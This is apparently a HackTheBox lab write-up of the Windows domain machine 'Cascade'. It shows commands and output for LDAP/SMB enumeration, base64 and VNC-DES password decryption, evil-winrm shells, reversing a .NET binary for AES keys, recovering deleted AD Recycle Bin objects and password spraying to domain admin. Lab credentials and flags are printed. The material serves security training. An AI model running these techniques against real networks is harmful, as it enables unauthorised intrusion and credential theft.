---
title: "HackTheBox - Cascade"
author: DrLi
description: "Writeup of an medium-rated  machine from HackTheBox"
date: 2025-11-9 12:11:20 +0000
categories : [HackTheBox]
tags: [hackthebox, windows, medium, active directory, smb, vnc, reverse engineering, dll, crypto, ldap, password reuse, recyclebin]
img_path: /assets/img/HackTheBox/Machines/Cascade
image:
    path: /assets/img/HackTheBox/Machines/Cascade/cascade.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

[Cascade] (https://www.hackthebox.com/machines/cascade) from [HackTheBox] (https://www.hackthebox.com/) is a medium Windows machine that begins with anonymous LDAP enumeration. We extracted a base64-encoded legacy password from LDAP attributes, granting SMB access to find a VNC registry file. After decrypting the VNC password using the known DES key, we gained WinRM access as s.smith. In the Audit$ share, we discovered a .NET binary and SQLite database containing an AES-encrypted password. Reverse engineering the binary with ILSpy revealed the encryption key and IV, allowing us to decrypt the arksvc credentials. Finally, we leveraged AD Recycle Bin privileges to recover a deleted TempAdmin account with cascadeLegacyPwd, which matched the Administrator password, achieving full domain compromise.



## **Enumeration**

### nmap

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nmap -T4 --min-rate 1000 -sV -sC -Pn -n -p- 10.129.211.123 -o nmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 07:22 EST
Stats: 0:03:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.04% done; ETC: 07:25 (0:00:07 remaining)
Nmap scan report for 10.129.211.123
Host is up (0.075s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-08 12:25:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-08T12:26:27
|_  start_date: 2025-11-08T12:17:58
|_clock-skew: 15s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 286.82 seconds
```

we have normal AD ports

we should start with SMB and see what we can do 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u '' -p ''                                                     
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\: 
                                                                                                                                         
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u '' -p '' --users
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\: 
SMB         10.129.211.123  445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                             
SMB         10.129.211.123  445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain                                                                  
SMB         10.129.211.123  445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.211.123  445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.211.123  445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.211.123  445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.211.123  445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.211.123  445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.211.123  445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.211.123  445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.211.123  445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.211.123  445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.211.123  445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.211.123  445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.211.123  445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.211.123  445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.211.123  445    CASC-DC1         [*] Enumerated 15 local users: CASCADE

```

anonymous login is on and we can see the users 

but not the shares 

let’s try to enumerate LDAP 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ ldapsearch -x -H ldap://10.129.211.123 -b "DC=cascade,DC=local"
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 134070789247167899
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

we have a password 

let’s try and log in using it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ echo "clk0bjVldmE=" | base64 -d                                      
rY4n5eva 

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u 'r.thompson' -p 'rY4n5eva'                                   
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
                                                                                                                       
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.211.123  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.211.123  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.211.123  445    CASC-DC1         -----           -----------     ------
SMB         10.129.211.123  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.211.123  445    CASC-DC1         Audit$                          
SMB         10.129.211.123  445    CASC-DC1         C$                              Default share
SMB         10.129.211.123  445    CASC-DC1         Data            READ            
SMB         10.129.211.123  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.211.123  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.211.123  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.211.123  445    CASC-DC1         SYSVOL          READ            Logon server share 

```

it works and we have READ access to the Data share 

let’s see what’s inside

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ smbclient  -U 'r.thompson' //10.129.211.123/Data         
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1627037 blocks available
```

from it we got three files

```bash
smb: \IT\Email Archives\> ls
  .                                   D        0  Tue Jan 28 13:00:30 2020
  ..                                  D        0  Tue Jan 28 13:00:30 2020
  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 13:00:12 2020

                6553343 blocks of size 4096. 1626777 blocks available
smb: \IT\Email Archives\> get Meeting_Notes_June_2018.html 
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as Meeting_Notes_June_2018.html (9.3 KiloBytes/sec) (average 9.3 KiloBytes/sec)

smb: \IT\LOgs\Ark AD Recycle Bin\> ls
  .                                   D        0  Fri Jan 10 11:33:45 2020
  ..                                  D        0  Fri Jan 10 11:33:45 2020
  ArkAdRecycleBin.log                 A     1303  Tue Jan 28 20:19:11 2020

                6553343 blocks of size 4096. 1627035 blocks available
smb: \IT\LOgs\Ark AD Recycle Bin\> get ArkAdRecycleBin.log 
getting file \IT\LOgs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as ArkAdRecycleBin.log (3.6 KiloBytes/sec) (average 6.0 KiloBytes/sec)

smb: \IT\Temp\s.smith\> ls
  .                                   D        0  Tue Jan 28 15:00:01 2020
  ..                                  D        0  Tue Jan 28 15:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

                6553343 blocks of size 4096. 1627029 blocks available
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (6.9 KiloBytes/sec) (average 6.9 KiloBytes/sec)
```

checking each one 

first the RecycleBin has nothing interesting

```bash
1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0	
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
```

but the Meeting notes had this

```bash
<p>For anyone that missed yesterday’s meeting (I’m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the “Best GPO” competition will be
announced on Friday so get your submissions in soon.</p>
```

so there is a user called `TempAdmin`and it’s password is the normal admin password

but we have no idea about the admins password so we can’t do anything 

moving on to the VNC file

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ cat "VNC Install.reg"
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

there is a password there and since this file was in the users s.smith directory it could be his password 

let’s try to decrypt it 

VNC uses DES encryption with a hardcoded key to store passwords

so the key and IV are known 

let’s decrypt the password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ echo -n "6bcf2a4b6e5aca0f" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

now let’s try the password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u 's.smith' -p 'sT333ve2'   
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
                                                                                                                       
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u 's.smith' -p 'sT333ve2' --shares
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
SMB         10.129.211.123  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.211.123  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.211.123  445    CASC-DC1         -----           -----------     ------
SMB         10.129.211.123  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.211.123  445    CASC-DC1         Audit$          READ            
SMB         10.129.211.123  445    CASC-DC1         C$                              Default share
SMB         10.129.211.123  445    CASC-DC1         Data            READ            
SMB         10.129.211.123  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.211.123  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.211.123  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.211.123  445    CASC-DC1         SYSVOL          READ            Logon server share 
```

it works and we have READ access over the Audit share 

before accessing the share the user has WinRM access based on bloodhound data

![image.png](/assets/img/HackTheBox/Machines/Cascade/image.png)

now let’s connect to WinRM

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ evil-winrm -i cascade.local -u 's.smith' -p 'sT333ve2'  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\s.smith\desktop> ls

    Directory: C:\Users\s.smith\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/8/2025  12:19 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk

*Evil-WinRM* PS C:\Users\s.smith\desktop> cat user.txt
8ca218d31d765a05c783d5b0aaec9ff4
```

# Privilege Escalation

let’s access the Audit share

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ smbclient  -U 's.smith' //10.129.211.123/Audit$  
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1626624 blocks available
smb: \> cd DB
smb: \DB\> ls
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020

                6553343 blocks of size 4096. 1626624 blocks available
smb: \DB\> get Audit.db 
getting file \DB\Audit.db of size 24576 as Audit.db (60.8 KiloBytes/sec) (average 60.8 KiloBytes/sec)
```

we have some binaries and a DB inside it 

we can find this 

![image.png](/assets/img/HackTheBox/Machines/Cascade/image1.png)

and when we decode the password from base64 we get this 

```bash
QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09
```

which doesn’t work as password 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc smb cascade.local -u 'arksvc' -p 'QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09'         
SMB         10.129.211.123  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.211.123  445    CASC-DC1         [-] cascade.local\arksvc:QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09 STATUS_LOGON_FAILURE
```

which means there is some type of encryption

and looking through the binaries we have there is a DLL named `CascCrypto`

so let’s download them and reverse engineer them and see what we can find 

opening the EXE in ghidra and looking through the strings we can find this 

![image.png](/assets/img/HackTheBox/Machines/Cascade/image2.png)

this is the encryption key 

first let’s investigate what language the binary and see how to decompile it 

![image.png](/assets/img/HackTheBox/Machines/Cascade/image3.png)

it’s a .NET binary let’s open it using `ILSpy` 

![image.png](/assets/img/HackTheBox/Machines/Cascade/image4.png)

now we have the IV and KEY and we know it’s AES CBC encryption 

let’s decrypt the password 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ python3 decrypt-pass.py
Raw bytes: b'w3lc0meFr31nd\x03\x03\x03'
As string: w3lc0meFr31nd
Stripped nulls: w3lc0meFr31nd
```

let’s try to connect

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc ldap cascade.local -u 'arksvc'  -p 'w3lc0meFr31nd'                 
LDAP        10.129.211.123  389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.211.123  389    CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd 
```

now let’s see what we can do

from bloodhound we can see this

![image.png](/assets/img/HackTheBox/Machines/Cascade/image5.png)

our compromised user is part of the AD RecycleBin group which means we can see what are the deleted objects

we can see this using `bloodyAD`

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ python3 ~/Desktop/bloodyAD/bloodyAD.py -u arksvc -d cascade.local -p 'w3lc0meFr31nd' --host 10.129.211.123 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name 

distinguishedName: CN=Deleted Objects,DC=cascade,DC=local
name: Deleted Objects
.....

distinguishedName: CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
name: TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a

distinguishedName: CN=dddd\0ADEL:f9bfa86b-d7ab-4561-b4b3-dbb1edb51f49,CN=Deleted Objects,DC=cascade,DC=local
name: dddd
DEL:f9bfa86b-d7ab-4561-b4b3-dbb1edb51f49

distinguishedName: CN=Remote Users\0ADEL:bb1032e5-e103-4ce4-934e-25a133a615f2,CN=Deleted Objects,DC=cascade,DC=local
name: Remote Users
DEL:bb1032e5-e103-4ce4-934e-25a133a615f2

distinguishedName: CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
name: Scheduled Tasks
DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2

distinguishedName: CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
name: {A403B701-A528-4685-A816-FDEE32BDDCBA}
DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

distinguishedName: CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
name: Machine
DEL:93c23674-e411-400b-bb9f-c0340bda5a34

distinguishedName: CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
name: User
DEL:746385f2-e3a0-4252-b83a-5a206da0ed88

distinguishedName: CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
name: TempAdmin
DEL:f0cc344d-31e0-4866-bceb-a842791ca059
```

we can see that the TempAdmin user is deleted twice 

and the info we know is `“Username is TempAdmin (password is the same as the normal admin account password).”`

so if we can find the TempAdmin password we can connect as an admin account 

let’s try to read the attributes of both deleted TempADmin users

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ python3 ~/Desktop/bloodyAD/bloodyAD.py -u arksvc -d cascade.local -p 'w3lc0meFr31nd' --host 10.129.211.123 get search -c 1.2.840.113556.1.4.2064 --base 'CN=Deleted Objects,DC=cascade,DC=local' --filter '(name=TempAdmin*)' --attr '*'

distinguishedName: CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
cn: TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a
instanceType: 4
isDeleted: True
isRecycled: True
lastKnownParent: OU=Users,OU=UK,DC=cascade,DC=local
msDS-LastKnownRDN: TempAdmin
name: TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a
objectClass: top; person; organizationalPerson; user
objectGUID: 5ea231a1-5bb4-4917-b07a-75a57f4c188a
objectSid: S-1-5-21-3332504370-1206983947-1165150453-1112
sAMAccountName: TempAdmin
uSNChanged: 233557
uSNCreated: 28701
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
whenChanged: 2020-01-27 00:07:24+00:00
whenCreated: 2020-01-09 20:17:23+00:00

distinguishedName: CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
cn: TempAdmin
DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage: 0
countryCode: 0
dSCorePropagationData: 2020-01-27 03:23:08+00:00
displayName: TempAdmin
givenName: TempAdmin
instanceType: 4
isDeleted: True
lastKnownParent: OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
msDS-LastKnownRDN: TempAdmin
name: TempAdmin
DEL:f0cc344d-31e0-4866-bceb-a842791ca059
objectClass: top; person; organizationalPerson; user
objectGUID: f0cc344d-31e0-4866-bceb-a842791ca059
objectSid: S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID: 513
pwdLastSet: 2020-01-27 03:23:08.347950+00:00
sAMAccountName: TempAdmin
uSNChanged: 237705
uSNCreated: 237695
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: TempAdmin@cascade.local
whenChanged: 2020-01-27 03:24:34+00:00
whenCreated: 2020-01-27 03:23:08+00:00

```

and there we go we found a password 

let’s try to connect with it 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles 

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ nxc ldap cascade.local -u usres.txt -p 'baCT3r1aN00dles'
LDAP        10.129.211.123  389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.211.123  389    CASC-DC1         [-] cascade.local\arksvc:baCT3r1aN00dles 
LDAP        10.129.211.123  389    CASC-DC1         [-] cascade.local\s.smith:baCT3r1aN00dles 
LDAP        10.129.211.123  389    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
```

finally we have admin access

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Cascade]
└─$ evil-winrm -i cascade.local -u 'administrator' -p 'baCT3r1aN00dles'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4421927483b2ed39a9d0b4f83bef31d7
```

DONE!